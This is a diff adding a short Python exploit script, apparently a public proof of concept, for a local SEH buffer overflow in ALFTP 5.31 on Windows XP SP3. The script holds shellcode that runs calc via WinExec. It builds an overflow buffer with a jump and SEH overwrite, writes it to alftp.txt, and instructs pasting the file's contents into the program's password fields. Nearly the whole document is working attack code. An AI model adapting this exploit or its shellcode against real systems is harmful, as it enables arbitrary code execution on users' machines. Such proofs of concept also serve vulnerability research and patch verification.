@@ -1,0 +1,27 @@
+# Exploit Title: ALFTP 5.31 - Local Buffer Overflow (SEH Bypass)        
+# Exploit Author: Gokul Babu                  
+# Vendor Homepage: http://www.altools.com/downloads/alftp.aspx                    
+# Vulnerable Software: http://advert.estsoft.com/?event=201001127730323               
+# Tested on: Windows XP Professional SP3 -Version-2002                    
+# Steps to reproduce-1: (eip overwrite-88-windows-XP)
+# Paste the contents of alftp.txt in 'options->Preference->Security->New password &Confirm password' 
+
+#seh- 0041A6EF "\xEF\xA6\x41"
+#address to jump 0012FA7A
+#nseh- "\xEB\xAC\x90\x90"
+#winexec address 0x7c862aed
+
+#!/usr/bin/python
+
+shellcode=("\x33\xC0"
+"\x50"
+"\x68\x63\x61\x6C\x63"
+"\x8B\xC4"
+"\x50"
+"\xE8\x61\x30\x73\x7C")
+
+buf="\x90"*4 + shellcode + "\x90"*(80-len(shellcode)) + "\xEB\xAC\x90\x90" + "\xEF\xA6\x41"
+
+f=open("alftp.txt","w")
+f.write(buf)
+f.close()
